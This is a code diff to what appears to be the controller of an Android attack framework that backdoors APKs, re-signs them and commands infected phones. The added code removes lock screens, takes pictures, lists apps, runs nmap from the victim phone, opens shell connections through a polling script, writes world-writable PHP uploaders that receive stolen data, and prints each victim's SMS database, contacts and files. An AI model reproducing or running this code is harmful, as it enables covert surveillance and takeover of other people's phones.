@@ -33,7 +33,7 @@ def usage():
     print "\t-s <signing> mechanism (masterkey,keystore file location)"
     print "\t-p <password> for keystore"
     print "\t-j <jarsigner> alias"
-    print "-Agent <function> (list,command)"
+    print "-Agent <function> (list,data,command)"
     print "\t-n <number> of agent"
     print "\t-d <delivery method> (http,sms)"
     print "\t-c <command>"
@@ -122,7 +122,8 @@ def main(argv):
             appstore = arg
         if opt == '-c':
             clone = arg
-            command = arg
+            command = arg.strip()
+	    print command
         if opt == '-l':
             campaignlabel = arg
         if opt == '-a':
@@ -134,6 +135,8 @@ def main(argv):
     if agent == True:
         if agentparam == "list":
             list_live_agents()
+	if agentparam == "data":
+	    agent_data_get()
         if agentparam == "command":
             if number == None and agentparameters == None:
                 list_agent_commands()
@@ -162,7 +165,7 @@ def autopwnphish(url,text,number,numberfile,page):
 	os.system("service metasploit start >/dev/null")
 
 def agentcommand(number,command,agentparameters,deliverymethod):
-    if command == 1 or command == "SPAM":      
+    if command == "SPAM":     
         params = agentparameters.split(",")
         for x in range(0,len(params)):
             param = params[x].split(":")
@@ -181,8 +184,111 @@ def agentcommand(number,command,agentparameters,deliverymethod):
             elif param[0] == "syntax":
                 syntax = param[1]
         if deliverymethod.lower() == "http":
-            sendcommandhttp(number,command + " none http " + downloaded + " " + syntax)
-        elif command == "DOWN":
+                 sendcommandhttp(number,command + " none http " + downloaded + " " + syntax)
+    elif command == "APKS":
+            downloaded = "no"
+            syntax = "pm list packages"
+            if deliverymethod.lower() == "http":
+                 sendcommandhttp(number,"EXUP" + " none http " + downloaded + " " + syntax)
+    elif command == "LOCK":
+           downloaded = "no"
+           syntax = "am start --user 0 -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task"
+	   if deliverymethod.lower() == "http":
+		 sendcommandhttp(number,"EXUP" + " none http " + downloaded + " " + syntax)
+    elif command == "PICT":
+	if deliverymethod.lower() == "http":
+	   sendcommandhttp(number,command + " http")
+    elif command == "PING":
+	    if deliverymethod.lower() == "http":
+		sendcommandhttp(number,command + " http http")
+    elif command == "CONN":
+	params = agentparameters.split(",")
+        for x in range(0,len(params)):
+            param = params[x].split(":")
+            if param[0] == "port":
+                port1 = param[1]
+	    elif param[0] == "communication":
+		communication = param[1]
+	webserver = config.get("WEBSERVER")
+        db = DB(config=config)
+        db.query("SELECT path from agents where number=%s", (number,))
+        path = db.fetchone()[0]
+	db.query("SELECT controlkey from agents where number=%s", (number,))
+        key = db.fetchone()[0]
+        if communication.lower() == "sms":
+                command = "perl shellpoll.pl " + path + " " + port1 + " " + communication + " " + "1" + " " + key + " " + number
+                os.system(command)
+        elif communication.lower() == "http":
+            command = "perl shellpoll.pl " + path + " " + port1 + " " + communication + " " + "none" + " " + key + " " + number
+            os.system(command)
+    elif command == "LIST":
+	params = agentparameters.split(",")
+        for x in range(0,len(params)):
+            param = params[x].split(":")
+            if param[0] == "port":
+                port1 = param[1]
+	webserver = config.get("WEBSERVER")
+        db = DB(config=config)
+        db.query("SELECT path from agents where number=%s", (number,))
+        path = db.fetchone()[0]
+        fullpath = webserver + path
+        com = fullpath + "/" + port1 + ".txt"
+        commd = "touch " + com
+        os.system(commd)
+        command7 = "chmod 777 " + com
+        os.system(command7)
+        com = fullpath + "/" + port1 + "control"
+        commd = "touch " + com
+        os.system(commd)
+        command7 = "chmod 777 " + com
+        os.system(command7)
+        textupload = fullpath + "/" + port1 + "uploader.php"
+        command10 = "touch " + textupload
+        os.system(command10)
+        command11 = "chmod 777 " + textupload
+        os.system(command11)
+        textuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('" + port1 + ".txt', 'ab');\nfwrite($file, $base);\n?>"
+        f = open(textupload, 'w')
+        f.write(textuploadtext)
+        f.close()
+        connectupload = fullpath + "/" + port1 + "controluploader.php"
+        command12 = "touch " + connectupload
+        os.system(command12)
+        command13 = "chmod 777 " + connectupload
+        os.system(command13)
+        connectuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('" + port1 + "control','wb');\nfwrite($file, $base);\n?>";
+        f = open(connectupload, 'w')
+        f.write(connectuploadtext)
+        f.close()
+	if deliverymethod.lower() == "http":
+                 sendcommandhttp(number,command + " http http " + port1)
+    elif command == "UAPK":
+       params = agentparameters.split(",")
+       for x in range(0,len(params)):
+              param = params[x].split(":")
+              if param[0] == "apk":
+                apk = param[1]
+       if deliverymethod.lower() == "http":
+                 sendcommandhttp(number,command + " none http " + apk)
+    elif command == "EXUP":
+        params = agentparameters.split(",")
+        for x in range(0,len(params)):
+            param = params[x].split(":")
+            if param[0] == "downloaded":
+                downloaded = param[1]
+            elif param[0] == "syntax":
+                syntax = param[1]
+        if deliverymethod.lower() == "http":
+                 sendcommandhttp(number,command + " none http " + downloaded + " " + syntax)
+    elif command == "UPLD":
+	    params = agentparameters.split(",")
+            for x in range(0,len(params)):
+                param = params[x].split(":")
+                if param[0] == "file":
+                    filetoget = param[1]
+	    if deliverymethod.lower() == "http":
+		sendcommandhttp(number, command + " http " + filetoget)
+    elif command == "DOWN":
             params = agentparameters.split(",")
             for x in range(0,len(params)):
                 param = params[x].split(":")
@@ -201,7 +307,33 @@ def agentcommand(number,command,agentparameters,deliverymethod):
             os.system(command2)
             if deliverymethod.lower() == "http":
                 sendcommandhttp(number,command + " none http " + path + " /" + filename)
-
+    elif command == "SMSS":
+		 if deliverymethod.lower() == "http":
+            		sendcommandhttp(number,command + " http http")
+    elif command == "GTIP":
+                 if deliverymethod.lower() == "http":
+                        sendcommandhttp(number,command + " http http")   
+    elif command == "CONT":
+		 if deliverymethod.lower() == "http":
+			sendcommandhttp(number,command + " http http")
+    elif command == "NMAP":
+        db = DB(config=config)
+        db.query("SELECT path from agents where number=%s", (number,))
+        path = db.fetchone()[0]
+	webserver = config.get("WEBSERVER")
+        nmaplocation = config.get("ANDROIDNMAPLOC")
+        copynmap1 = "cp " + nmaplocation + "/bin/nmap " + webserver + path + "/nmap"
+        os.system(copynmap1)
+        copynmap2 = "cp " + nmaplocation + "/share/nmap/nmap-services " + webserver + path + "/nmap-services"
+        os.system(copynmap2)
+	copynmap3 = "cp " + nmaplocation + "/share/nmap/nse_main.lua " + webserver + path + "/nse_main.lua"
+        os.system(copynmap3) 
+	params = agentparameters.split(",")
+        for x in range(0,len(params)):
+                param = params[x].split(":")
+                if param[0] == "targets":
+                    targets = param[1]
+	sendcommandhttp(number,command + " none http " + targets) 
 def sendcommandhttp(number,command):
     webserver = config.get("WEBSERVER")
     db = DB(config=config)
@@ -235,10 +367,10 @@ def list_agent_commands():
     print "\t11.) Connect to Listener (CONN)"
     print "\t12.) Run Nmap (NMAP)"
     print "\t13.) Execute Command and Upload Results (EXUP)"
-    print "\t14.) Get Installed Apps List (APPS)"
+    print "\t14.) Get Installed Apps List (APKS)"
     print "\t15.) Remove Locks (Android < 4.4) (LOCK)"
     print "\t16.) Upload APK (UAPK)"
-    print "\t17.) Get Wifi IP Address (IPAD)"
+    print "\t17.) Get Wifi IP Address (GTIP)"
 
 
 def list_live_agents():
@@ -264,6 +396,59 @@ def list_live_agents():
         s = db.fetchone()[0]
         if s == "Y":
             print "\t " + r
+
+def agent_data_get():
+    if check_mysql() == 0:
+        os.system("service mysql start>/dev/null")
+    try:
+        db = DB(config=config)
+    except DBException as e:
+        if e[0] == 2:
+            os.system("mysqladmin -u " + config.get("MYSQLUSER") + " create shevirah -p" + config.get("MYSQLPASS"))
+        else:
+            raise
+    db = DB(config=config)
+    table = "agents"
+    db.query("SELECT COUNT(*) from agents")
+    row = db.fetchone()[0]
+    for i in range(1, row+1):
+        db.query("SELECT number from agents where id=%s", (i, ))
+        r = db.fetchone()[0]
+        db.query("SELECT active from agents where id=%s", (i, ))
+        s = db.fetchone()[0]
+        if s == "Y":
+            print r + ":"
+	    get_data(i)
+
+def get_data(id):
+    db = DB(config=config)
+    db.query("SELECT sms from agentsdata where id=%s", (id,))
+    smsrow = db.fetchone()[0]
+    db.query("SELECT contacts from agentsdata where id=%s", (id,))
+    contactsrow = db.fetchone()[0]
+    db.query("SELECT picture from agentsdata where id=%s", (id,))
+    picturerow = db.fetchone()[0]
+    db.query("SELECT root from agentsdata where id=%s", (id,))
+    rootrow = db.fetchone()[0]
+    db.query("SELECT ping from agentsdata where id=%s", (id,))
+    pingrow = db.fetchone()[0]
+    db.query("SELECT file from agentsdata where id=%s", (id,))
+    filerow = db.fetchone()[0]
+    db.query("SELECT packages from agentsdata where id=%s", (id,))
+    packagerow = db.fetchone()[0]
+    db.query("SELECT apk from agentsdata where id=%s", (id,))
+    apkrow = db.fetchone()[0]
+    db.query("SELECT ipaddress from agentsdata where id=%s", (id,))
+    ipaddressrow = db.fetchone()[0]
+    print "SMS Database: " + (smsrow if smsrow else '')
+    print "Contacts: " + (contactsrow if contactsrow else '')
+    print "Picture Location: " + (picturerow if picturerow else '')
+    print "Rooted: " + (rootrow if rootrow else '')
+    print "Ping Sweep: " + (pingrow if pingrow else '')
+    print "File: " + (filerow if filerow else '')
+    print "Packages: " + (packagerow if packagerow else '')
+    print "App: " + (apkrow if apkrow else '')
+    print "Wifi IP Address: " + (ipaddressrow if ipaddressrow else ' ')
 
 
 def database_add_agents_1(number, path, key, number2, platform,deliverymethod):
@@ -440,7 +625,7 @@ def androidbackdoor(inputfile,number,key,url,signing,jarsignalias,keypass,delive
           os.chdir(apksloc)
           copycom = "cp -rf AndroidAgentBAK AndroidAgent"
           os.system(copycom) 
-          decompile = apktoolloc + "/apktool d " + inputfile + ">/dev/null"
+          decompile = apktoolloc + "/apktool d " + inputfile  #+ ">/dev/null"
           os.system(decompile)
           path,file = os.path.split(inputfile)
           foldername = file[:-4]
@@ -503,9 +688,9 @@ def androidbackdoor(inputfile,number,key,url,signing,jarsignalias,keypass,delive
           f.write(line4)
           f.close()
           androidsdk = config.get("ANDROIDSDK")
-          command = androidsdk + "/tools/android update project --name AndroidAgent" + " --path " + "AndroidAgent/" + ">/dev/null"
+          command = androidsdk + "/tools/android update project --name AndroidAgent" + " --path " + "AndroidAgent/" #+ ">/dev/null"
           os.system(command)
-          command = "ant -f " + "AndroidAgent" +  "/build.xml clean debug"  + ">/dev/null"
+          command = "ant -f " + "AndroidAgent" +  "/build.xml clean debug" # + ">/dev/null"
           #command = "ant -f " + "AndroidAgent" + "/build.xml release" 
           os.system(command)
           decompile = apktoolloc + "/apktool d " + "AndroidAgent/bin/AndroidAgent-debug.apk" + " -o AndroidAgent2/"  + ">/dev/null"
@@ -634,12 +819,16 @@ def androidbackdoor(inputfile,number,key,url,signing,jarsignalias,keypass,delive
                         new_parent = child.get('parent').replace('@*android:style/','@android:style/')
                         child.set('parent', new_parent)
               tree.write(xml_path)
+          xml_path = foldername + '/res/layout/aboutus_main.xml'
+	  #if os.path.exists(xml_path):
+	  #	tree = ET.parse(xml_path)
+
           os.environ["PATH"] = os.environ["PATH"] + ":" + apktoolloc
-          compile = apktoolloc + "/apktool b " + foldername + " -o Backdoored/" + foldername + ".apk"  + ">/dev/null"
+          compile = apktoolloc + "/apktool b " + foldername + " -o Backdoored/" + foldername + ".apk"  #+ ">/dev/null"
           os.system(compile)
           remove = "rm -rf " + foldername 
           os.system(remove)
-          decomp = apktoolloc + "/apktool d Backdoored/" + foldername + ".apk -o" + foldername + "/"    + ">/dev/null"
+          decomp = apktoolloc + "/apktool d Backdoored/" + foldername + ".apk -o" + foldername + "/"    #+ ">/dev/null"
           os.system(decomp)
           tree = ET.ElementTree()
           tree.parse(foldername + "/res/values/public.xml")
@@ -691,7 +880,7 @@ def androidbackdoor(inputfile,number,key,url,signing,jarsignalias,keypass,delive
                       jarsignalias = config.get("KEYALIAS")
                 if keypass == None:
 			keypass = config.get("KEYPASS")
-                signcommand =  "jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore " + signing +" -storepass " + keypass + " Backdoored/" + foldername + ".apk " +  jarsignalias + ">/dev/null"
+                signcommand =  "jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore " + signing +" -storepass " + keypass + " Backdoored/" + foldername + ".apk " +  jarsignalias  + ">/dev/null"
                 os.system(signcommand)
                 androidagentlocation = config.get("ANDROIDAGENT")
                 copycommand = "cp Backdoored/" + foldername + ".apk " +androidagentlocation + number + ".apk"
@@ -944,7 +1133,7 @@ def stop_poller(poller):
             p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
             out, err = p.communicate()
             for line in out.splitlines():
-                if 'agentpoller.py' in line or 'agentattachpoller.py' in line:
+                if 'agentpoll.py' in line or 'agentattachpoller.py' in line:
                     pid = int(line.split()[1])
                     os.kill(pid, signal.SIGKILL)
             if check_mysql() == 0:
@@ -957,7 +1146,7 @@ def stop_poller(poller):
 
             db = DB(config=config)
             db.query("DROP TABLE IF EXISTS agents")
-            db.query("DROP TABLE IF EXISTS agentdata")
+            db.query("DROP TABLE IF EXISTS agentsdata")
 
 def make_api(path,key):
     make_apifiles(path)
